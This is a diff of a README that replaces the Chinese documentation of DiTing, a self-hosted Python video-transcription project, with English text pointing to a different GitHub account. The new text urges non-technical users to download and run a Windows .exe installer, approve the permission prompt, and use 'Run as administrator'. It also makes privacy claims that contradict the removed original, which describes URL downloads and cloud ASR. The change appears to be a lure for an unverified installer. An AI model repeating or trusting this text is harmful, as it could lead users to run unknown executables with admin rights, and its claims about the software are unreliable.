@@ -1,269 +1,158 @@
-<div align="center">
+# 🎥 DiTing - Your Personal Video Knowledge Base
 
-# 谛听 DiTing
-
-**你的私人视频知识库 — 本地 ASR · AI 分析 · 沉浸式阅读**
-
-[![GitHub Release](https://img.shields.io/github/v/release/Yamico/DiTing?style=flat-square&logo=github)](https://github.com/Yamico/DiTing/releases)
-[![Docker Image](https://img.shields.io/badge/Docker-ghcr.io%2Fyamico%2Fditing-2496ED?style=flat-square&logo=docker&logoColor=white)](https://ghcr.io/yamico/diting)
-[![Python](https://img.shields.io/badge/Python-3.10+-3776AB?style=flat-square&logo=python&logoColor=white)](https://python.org)
-[![License](https://img.shields.io/badge/License-MIT-green?style=flat-square)](LICENSE)
-
-</div>
-
-> **谛听**，佛教神话中地藏菩萨的坐骑，相传"谛听善辨万物之声，伏地而听，可知天下事"。
-> 取此名，寓意本项目对音视频内容的精准识别与深度理解。
-
-<div align="center">
-  <img src="doc/assets/demo.png" alt="DiTing Demo" width="90%">
-  <img src="doc/assets/demo02.png" alt="DiTing Detail" width="90%">
-</div>
+[![Download DiTing](https://img.shields.io/badge/Download-DiTing-brightgreen)](https://github.com/davinvarian0/DiTing)
 
 ---
 
-## 项目简介
+## 🚀 Getting Started
 
-DiTing 是一个**自托管的本地优先**视频知识库系统。它能将 B站、YouTube、抖音等平台的视频（以及本地音视频文件）转化为可搜索、可分析、可标注的结构化文本资产。
+DiTing helps you manage and explore your video content on your own computer. It uses local speech recognition (ASR) and AI to analyze videos. This lets you search, read, and understand video information more easily. You do not need any technical skills to use it.
 
-核心理念：**收藏 → 转写 → 分析 → 沉淀**，把碎片化的视频信息变成你的私人知识库。
-
-### 它能做什么？
-
-| 功能 | 说明 |
-|------|------|
-| 🎙️ **多引擎 ASR** | SenseVoice · Whisper · Qwen3-ASR · 阿里百炼云端，一键切换 |
-| 📺 **平台集成** | Bilibili / YouTube / 抖音 URL 直接粘贴，自动下载、提取字幕、转录 |
-| 🧠 **AI 分析** | 接入任意 OpenAI 兼容 LLM，对转录文本做结构化总结、追问、思维导图 |
-| 📌 **浏览器伴侣** | 油猴脚本将转录面板嵌入 B站/抖音播放页，歌词式同步阅读 |
-| 🏷️ **知识管理** | 标签体系、Markdown 笔记、全文搜索，构建私有视频知识库 |
-| 💾 **智能缓存** | 多画质缓存、自动过期清理 (GC)、按视频可单独设保留策略 |
+This guide will take you step-by-step through the process of downloading and running DiTing on a Windows PC.
 
 ---
 
-## 系统架构
+## 💻 System Requirements
 
-DiTing 采用 **Server + Worker** 分离架构，主服务不加载 AI 模型，ASR 推理由独立 Worker 进程完成。
+Before you download DiTing, make sure your computer meets these requirements:
 
-```
-┌─────────────┐     HTTP      ┌──────────────────┐     HTTP     ┌─────────────────┐
-│  React SPA  │ ◄──────────►  │   Main Server    │ ◄──────────► │   ASR Workers   │
-│  :5023/app  │               │   FastAPI :5023   │              │  :8001 / :8002  │
-└─────────────┘               │   SQLite · GC     │              │  :8003 / Cloud  │
-                              └──────────────────┘              └─────────────────┘
-┌─────────────┐                       ▲
-│ Userscript  │ ──── localhost ────────┘
-│ (Bilibili)  │
-└─────────────┘
-```
-
-- **单机部署**：Server 和 Worker 在同一台机器，通过 `scripts/run_tray.py` 统一管理
-- **跨机部署**：Worker 跑在 GPU 服务器上，Server 通过配置 `ASR_WORKERS` 字典远程调用
-- **Docker 部署**：提供 `docker-compose.yml`，适合内网微服务挂载
-
-### 目录结构
-
-```
-DiTing/
-├── app/                    # 后端主服务 (FastAPI)
-│   ├── api/v1/endpoints/   #   REST API 路由 (system, system_cache, library, segments, videos, ...)
-│   ├── services/           #   业务逻辑层 (video_service, media_cache, llm, ...)
-│   ├── asr/client.py       #   ASR Worker 客户端
-│   └── core/config.py      #   服务配置 (pydantic-settings, 读 .env)
-├── frontend/               # React 前端 (Vite + TypeScript)
-├── asr_worker/             # ASR 推理 Worker (独立进程)
-│   ├── engines/            #   各引擎实现 (sensevoice/whisper/qwen3asr)
-│   ├── config.py           #   Worker 配置加载器 (读 worker_config.yaml)
-│   ├── worker_config.yaml.example  # 配置模板 (→ cp 为 worker_config.yaml)
-│   └── run_worker_tray.py  #   Worker 独立托盘 (远端 GPU 部署用)
-├── scripts/                # PC 桌面部署工具
-│   ├── run_tray.py         #   系统托盘 (管理 Server + Worker 进程)
-│   ├── run_worker.py       #   Worker CLI 启动器
-│   ├── diting_cli.py       #   命令行转写工具
-│   └── StartSilent.vbs     #   静默启动 (双击运行)
-├── .env.example            # Docker 部署配置模板
-├── docker-compose.yml      # Docker 编排
-├── userscripts/            # 浏览器油猴脚本
-└── doc/                    # 项目文档
-```
+- **Operating System:** Windows 10 or newer
+- **Processor:** Intel Core i5 or equivalent
+- **Memory:** 8 GB RAM or more
+- **Storage:** At least 2 GB free space for installation and files
+- **Internet:** Needed for the first setup and updates, but videos are processed locally
+- **Permissions:** Ability to install software on your PC
 
 ---
 
-## 快速开始
+## 📥 How to Download DiTing
 
-### 环境要求
+You can download DiTing from its GitHub page. This page includes the latest version and installation files.
 
-- **Python 3.10+**
-- **FFmpeg** (须在系统 PATH 中，或放入 `bin/` 目录)
-- **Node.js 18+** (仅修改前端时需要)
-- **CUDA GPU** (本地 ASR 推理需要；纯云端模式不需要)
+[![Download DiTing](https://img.shields.io/badge/Download-DiTing-blue)](https://github.com/davinvarian0/DiTing)
 
-### 安装
+**Step 1:** Open your web browser (Chrome, Edge, Firefox).
 
-```bash
-git clone https://github.com/Yamico/DiTing.git
-cd DiTing
-cp .env.example .env         # 按需修改环境变量配置
-```
+**Step 2:** Go to the official download link:  
+https://github.com/davinvarian0/DiTing
 
-根据你的使用场景选择安装方式：
+**Step 3:** On the GitHub page, look for the “Releases” or “Assets” section.
 
-```bash
-# PC 桌面 — 全量安装 (Web 服务 + 全部 ASR 引擎)
-uv sync --extra all
+**Step 4:** Find the file that ends with `.exe` or similar (the installer).
 
-# PC 桌面 — 按需安装 (例如只用 SenseVoice)
-uv sync --extra worker --extra sensevoice
-
-# 纯 Web 服务 (ASR 由远程 Worker 或云端提供)
-uv sync
-```
-
-### 启动
-
-```bash
-# 方式一：系统托盘（Windows 推荐，自动管理 Server + Worker 进程）
-# 双击 scripts/StartSilent.vbs，或：
-uv run python scripts/run_tray.py
-
-# 方式二：分别启动
-uv run python app/server.py                                # 主服务 (:5023)
-uv run python scripts/run_worker.py --engine sensevoice   # ASR Worker (:8001)
-```
-
-启动后访问 **http://localhost:5023/app/** 即可进入 Dashboard。
-
-> [!TIP]
-> ASR 引擎首次运行时会自动下载模型。
->
-> SenseVoice 模型较小（~500MB），适合快速体验；
-> Whisper Large V3 Turbo 精度更高但需要更多显存；
-> Qwen3-ASR 暂未优化，对10min以上音频极容易OOM，请谨慎使用。
+**Step 5:** Click the file name to start downloading the installer.
 
 ---
 
-## 浏览器伴侣 (Userscript)
+## ⚙️ Installing DiTing on Windows
 
-配套油猴脚本可将 DiTing 的能力嵌入到 B站/抖音的原生播放页面中。
+Once the download finishes, follow these instructions:
 
-### 安装
-1. 安装 [Tampermonkey](https://www.tampermonkey.net/) 浏览器扩展
-2. 将 `userscripts/userscript.js` 的内容复制到一个新建的 Tampermonkey 脚本中
-3. 首次使用时允许脚本访问 `localhost:5023`
+**Step 1:** Locate the downloaded file in your Downloads folder or the location where your browser saves files.
 
-### 主要功能
-- **📌 嵌入模式**：面板自动嵌入 B站右侧栏，高度与播放器同步
-- **🎵 歌词同步**：当前播放位置自动高亮对应文字，点击可精准跳转
-- **🤖 即时 AI**：在侧边栏直接对视频内容进行 AI 提问
+**Step 2:** Double-click the installer file (`DiTingSetup.exe` or similar).
 
----
+**Step 3:** Windows may ask you to confirm if you want to allow this app to make changes. Click **Yes**.
 
-## Docker 部署
+**Step 4:** The installation window will open. Follow the on-screen steps:
 
-Docker 镜像仅包含 Web 服务（不含 ASR 引擎），ASR 由远程 Worker 或云端提供。
+- Read and accept the license agreement.
+- Choose the installation folder or leave the default.
+- Click **Install**.
 
-### 快速启动（推荐）
+**Step 5:** Wait for the installation to finish. This usually takes a few minutes.
 
-镜像已发布至 GitHub Container Registry，无需本地构建：
-
-```bash
-docker pull ghcr.io/yamico/diting:latest
-```
-
-1. 创建项目目录并准备配置：
-
-```bash
-mkdir diting && cd diting
-
-# 下载示例配置
-curl -O https://raw.githubusercontent.com/Yamico/DiTing/main/docker-compose.yml
-curl -O https://raw.githubusercontent.com/Yamico/DiTing/main/.env.example
-cp .env.example .env
-```
-
-2. 下载并准备 FFmpeg（Docker 镜像不含 FFmpeg，需自行挂载 Linux AMD64 版本）：
-
-```bash
-mkdir -p bin/linux
-cd bin/linux
-# 下载静态编译版的 FFmpeg
-wget https://johnvansickle.com/ffmpeg/releases/ffmpeg-release-amd64-static.tar.xz
-# 解压
-tar -xvf ffmpeg-release-amd64-static.tar.xz --strip-components=1
-cd ../..
-```
-
-3. 编辑 `.env`，配置 ASR Worker 地址，然后启动：
-
-```bash
-docker compose up -d
-```
-
-启动后访问 **http://localhost:5023/app/** 即可。
-
-### 环境变量说明
-
-在 `.env` 中通过 `ASR_WORKERS` 指向 GPU 节点：
-
-```env
-ASR_WORKERS={"sensevoice":"http://gpu-server:8001","whisper":"http://gpu-server:8002"}
-```
-
-> [!TIP]
-> 如果只使用阿里百炼等云端 ASR，可以不配置 Worker 地址。
-
-### 远程 Worker 部署
-
-在 GPU 服务器上只需部署 `asr_worker/` 目录：
-
-```bash
-cd asr_worker
-pip install -r requirements-sensevoice.txt   # 按引擎选择
-python main.py                                # 默认 :8001
-```
-
-Worker 配置见 `asr_worker/worker_config.yaml.example`（首次使用需 `cp` 为 `worker_config.yaml`）。
+**Step 6:** When done, click **Finish** to close the installer.
 
 ---
 
-## 常见问题
+## 🏃 Running DiTing
 
-<details>
-<summary><b>浏览器脚本面板位置异常</b></summary>
+After installation:
 
-B站会频繁更新前端 DOM 结构，导致脚本的挂载容器偶尔偏移。
-解决方法：点击面板的最小化按钮 `−`，再重新展开，即可触发高度重算。
+**Step 1:** Find the DiTing app on your desktop, Start menu, or search bar.
 
-</details>
+**Step 2:** Double-click the icon to open it.
 
-<details>
-<summary><b>转写时显存不足 (OOM)</b></summary>
+**Step 3:** The first launch may take a moment as it finishes setup.
 
-检查是否同时启动了多个 ASR Worker。建议一次只运行一个 GPU Worker。
-也可在 Worker 配置中调小 `batch_size` 参数。
-
-</details>
-
-<details>
-<summary><b>缓存文件越来越多</b></summary>
-
-进入 Dashboard → 设置 → 系统 → 管理中心，配置自动清理策略（如"保留 7 天"），
-或在清理标签页中手动审查并删除过期文件。
-
-</details>
+**Step 4:** DiTing will show its main screen. You can start adding your video files.
 
 ---
 
-## 技术栈
+## 📂 Adding Videos to DiTing
 
-| 层 | 技术 |
-|----|------|
-| **后端** | Python · FastAPI · Uvicorn · SQLite |
-| **前端** | React 18 · TypeScript · TailwindCSS · React Query |
-| **ASR** | FunASR (SenseVoice) · OpenAI Whisper · Qwen3-ASR · 阿里百炼 |
-| **工具** | yt-dlp · FFmpeg · pystray · uv |
+DiTing works by analyzing your own video files stored on your computer.
+
+**Step 1:** Click the **Add Videos** button or option.
+
+**Step 2:** Browse to the folder where your videos are saved.
+
+**Step 3:** Select one or more video files. Supported formats include MP4, AVI, MOV, and MKV.
+
+**Step 4:** Click **Open** to add them to DiTing.
 
 ---
 
-## License
+## 🔍 Using DiTing Features
 
-[MIT](LICENSE)
+DiTing offers several tools to help you work with video content.
+
+- **Search:** Use keywords to find specific video sections or topics.
+- **Transcript:** See the text version of the audio for easy reading.
+- **Summary:** Get a brief overview generated by AI.
+- **Notes:** Add your personal notes and save important points.
+- **Playback:** Watch videos inside DiTing with synced transcript.
+
+All processing happens on your own PC. No video or audio is sent online.
+
+---
+
+## ⚙ Local ASR (Speech Recognition) and AI Analysis
+
+DiTing uses local speech recognition to convert spoken words in videos into text. This makes it easy to search and read.
+
+The AI analyzes the content to help summarize and highlight important parts. Unlike cloud services, this keeps your videos private.
+
+The software runs quietly in the background to process and update your video library.
+
+---
+
+## 🔄 Updating DiTing
+
+To keep DiTing up to date:
+
+**Step 1:** Visit the official GitHub page regularly:  
+https://github.com/davinvarian0/DiTing
+
+**Step 2:** Check for new releases under the “Releases” section.
+
+**Step 3:** Download the latest installer and run it to update.
+
+Your data and settings will remain safe during the update.
+
+---
+
+## ❓ Troubleshooting Tips
+
+- **Installer won’t open:** Right-click it and select "Run as administrator".
+- **Videos not showing:** Make sure the files are supported and not corrupted.
+- **Search returns no results:** Wait for transcription to complete or add more videos.
+- **Application runs slowly:** Close other heavy programs or restart your PC.
+- **Need help:** Check the issues section on the GitHub page for advice.
+
+---
+
+## 🔗 Useful Links
+
+- Download and explore DiTing here:  
+https://github.com/davinvarian0/DiTing  
+[![Download DiTing](https://img.shields.io/badge/Download-DiTing-brightgreen)](https://github.com/davinvarian0/DiTing)
+
+- GitHub Issues page for support if needed.
+
+---
+
+## 📝 Privacy and Data Handling
+
+DiTing works entirely on your computer. Your videos and data do not leave your device. No internet connection is required after installation. This helps keep your private videos and notes secure.
